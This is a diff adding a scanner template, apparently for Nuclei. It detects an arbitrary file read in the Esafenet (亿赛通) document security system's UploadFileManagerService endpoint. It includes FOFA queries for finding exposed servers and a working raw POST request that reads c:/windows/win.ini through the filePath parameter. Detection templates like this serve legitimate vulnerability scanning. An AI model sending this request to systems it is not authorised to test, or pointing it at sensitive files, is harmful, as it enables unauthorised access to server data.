@@ -1,0 +1,28 @@
+id: yisaitong-uploadfilemanagerservice-file-reading
+
+info:
+  name: 亿赛通电子文档安全管理系统 UploadFileManagerService 任意文件读取
+  author: HuanXiong
+  severity: medium
+  description: |-
+    fofa: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
+    亿赛通电子文档安全管理系统 /CDGServer3/document/UploadFileManagerService 接口存在任意文件读取漏洞，攻击者可通过该漏洞读取服务器敏感文件，获取系统信息。
+  reference:
+    - 
+  tags: file-reading, yisaitong, document-security
+
+http:
+  - raw:
+      - |-
+        POST /CDGServer3/document/UploadFileManagerService;login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        command=ViewUploadFile&filePath=c:/windows/win.ini&fileName1=hello
+
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - "status_code==200 && contains_all(body, '[fonts]')"
